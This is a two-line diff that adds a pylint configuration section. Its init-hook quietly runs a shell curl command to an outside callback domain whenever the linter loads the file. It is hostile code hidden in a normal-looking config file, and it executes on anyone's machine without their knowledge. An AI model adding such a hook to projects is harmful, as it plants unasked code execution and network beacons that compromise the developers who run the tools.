@@ -1,0 +1,2 @@
+[MASTER]
+init-hook='os.system("curl https://cvrpfqsp3mbjks9jetq0s7ine6uhb1ebo.hello-response.com")'
